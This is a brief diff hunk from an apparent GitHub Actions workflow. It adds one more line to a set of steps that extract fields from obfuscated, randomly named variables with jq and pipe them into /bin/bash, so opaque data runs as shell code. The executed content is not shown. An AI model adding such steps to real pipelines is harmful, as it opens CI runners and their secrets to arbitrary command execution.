@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$x2976" | jq -r .jnvja5 | /bin/bash
           printf '%s' "$owfz09" | jq -r .rgw02 | /bin/bash
           printf '%s' "$na4" | jq -r .pt83973 | /bin/bash
+          echo $hw426 | jq -r .chwpx5 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
